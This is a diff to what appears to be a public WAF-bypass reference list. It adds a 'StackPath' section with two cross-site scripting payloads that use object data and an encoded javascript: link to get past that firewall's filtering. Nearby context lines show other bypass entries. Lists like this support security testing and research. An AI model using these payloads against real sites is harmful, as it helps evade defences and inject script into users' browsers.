@@ -3734,6 +3734,13 @@ data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
 <input type=submit></form>
 ```
 
+### StackPath
+- [XSS Bypass](https://twitter.com/0xInfection/status/1298642820664823808) by [@0xInfection](https://twitter.com/0xInfection)
+```
+<object/data=javascript:alert()>
+<a/href="javascript%0A%0D:alert()>clickme
+```
+
 ### URLScan
 - [Directory Traversal](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L557) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) (<= v3.1) (Only on ASP.NET)
 ```
